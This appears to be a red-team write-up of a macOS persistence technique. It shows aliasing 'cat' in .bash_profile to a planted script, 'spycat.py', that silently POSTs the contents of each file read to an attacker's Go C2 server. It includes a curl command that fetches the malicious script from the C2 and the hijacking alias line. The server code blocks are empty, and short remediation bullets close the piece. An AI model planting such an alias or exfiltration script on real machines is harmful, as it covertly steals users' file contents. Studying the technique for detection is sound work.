
Assuming the Attacker is already on the target machine and would like to
establish some level of persistence on the Victim machine.
One possible way to achieve this is by modifying a binary that exists on the Victim's machine.
In a very simple form this results in the victim executing a binary they use everyday and in the
process also execute something for the Attacker. 
The Victim does not notice any difference in behviour of the standard binary.


## Scenario
This simple example with showcase how a python script can be planted on the Victim
machine and the `.bash_profile` can be updated to include and alias to this script.
The example script executes when `cat` is called on a file.
Simultaneously the contents of the file are sent to the Attacker.

```
┌───────────────┐              ┌───────────────┐
│    Victim     │              │    Attacker   │
│               │              │               │
│   spycat.py   │              │     C2.go     │
│               │              │               │
│   http POST   ├──────────────►   (log.txt)   │
│               │              │               │
└───────────────┘              └───────────────┘
```

The Victim machine will be MacOS in this case.
The Attacker machine is linux running a custom golang http server.


### Attacker Setup
The GoLang server has a single endpoint which accepts the `POST` of file data.
It writes the output to a log file `log.txt`.

Its composition is as such...

```


```

The go server can be started using `go run server.go`.

As a bonus let's add another endpoint which will simply allow for downloading the malicious script.

GET request
```

```

This script can be downloaded using any HTTP delivery mechanism,
for testing try it as CURL

```
curl -s https://localhost:8080/spycat >> spycat.py
```

### Victim Setup

A Python script can be created on the Victim machine which leverages the default
Python interpreter installed on MacOS.
Create the script on the machine or download from the Attackers C2 server.

Create an alias that points the normal `cat` command to the malicious version.

```
alias cat="python <absolute_path_to_file>/spycat.py"
```


## Remediation
* Read this blogpost, ie ingest this information into TIP platform (URL, filehash)
* Update endpoint signatures or create rule
* Threat hunt for any activity
* Block malicious domains and urls on the firewall

